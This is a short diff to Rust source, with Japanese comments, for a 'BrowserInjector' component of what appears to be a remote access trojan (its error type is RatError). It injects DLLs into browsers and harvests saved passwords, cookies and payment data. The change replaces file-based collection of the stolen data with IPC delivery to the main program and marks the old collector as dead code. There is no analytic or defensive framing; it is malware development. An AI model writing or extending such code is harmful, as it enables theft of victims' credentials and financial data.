@@ -117,11 +117,9 @@ impl BrowserInjector {
             println!("🎯 DLL注入完了: {}/{}ブラウザが成功", success_count, browsers.len());
             println!("📁 出力先: {}", self.output_dir.display());
             
-            // 注入後にデータを収集
-            let data = self.collect_injected_data().await?;
-            println!("🔍 収集されたDLLデータ: パスワード{}件, クッキー{}件, 支払い{}件", 
-                    data.passwords.len(), data.cookies.len(), data.payments.len());
-            Ok(data)
+            // IPCベースでは従来のファイル収集は行わない
+            println!("🔍 DLL注入完了：IPCデータ収集モード");
+            Ok(BrowserData::default()) // IPCで受信したデータはmain.rsで処理
         } else {
             println!("⚠️  対象ブラウザが見つからないか、すべて注入に失敗しました");
             Ok(BrowserData::default())
@@ -302,7 +300,8 @@ impl BrowserInjector {
         )))
     }
     
-    /// DLL注入後に出力されたデータを収集
+    // ファイルベース収集を削除：IPCで直接データを受信
+    #[allow(dead_code)]
     async fn collect_injected_data(&self) -> Result<BrowserData, RatError> {
         let mut data = BrowserData::default();
         
